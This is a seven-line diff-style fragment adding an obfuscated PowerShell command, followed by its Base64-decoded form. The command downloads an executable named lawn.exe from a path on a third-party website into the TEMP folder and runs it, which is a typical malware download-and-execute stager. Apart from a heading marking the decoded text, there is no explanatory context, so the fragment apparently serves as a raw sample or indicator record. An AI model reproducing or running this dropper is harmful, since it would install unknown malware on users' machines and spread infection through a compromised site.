@@ -1,0 +1,7 @@
+iex([SyStem.text.encOdING]::Utf8.GETSTrInG([sYSTEM.cONvERT]::FROMbasE64STriNG('CihOZXctT2JqZWN0IFNZU3RFbS5OZVQuV0ViQ0xJRW50KS5ET1duTE9hRGZJbGUoJ3d3dy5hdGhlbnNoZWFydGNlbnRlci5jb20vY29tcG9uZW50cy9jb21fZ2FudHJ5L2xhd24uZXhlJywiJEVuVjpURU1QXGxhd24uZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRFblY6VEVNUFxsYXduLmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYStEm.NeT.WEbCLIEnt).DOWnLOaDfIle('www.athensheartcenter.com/components/com_gantry/lawn.exe',"$EnV:TEMP\lawn.exe");Start-Process ("$EnV:TEMP\lawn.exe")
+
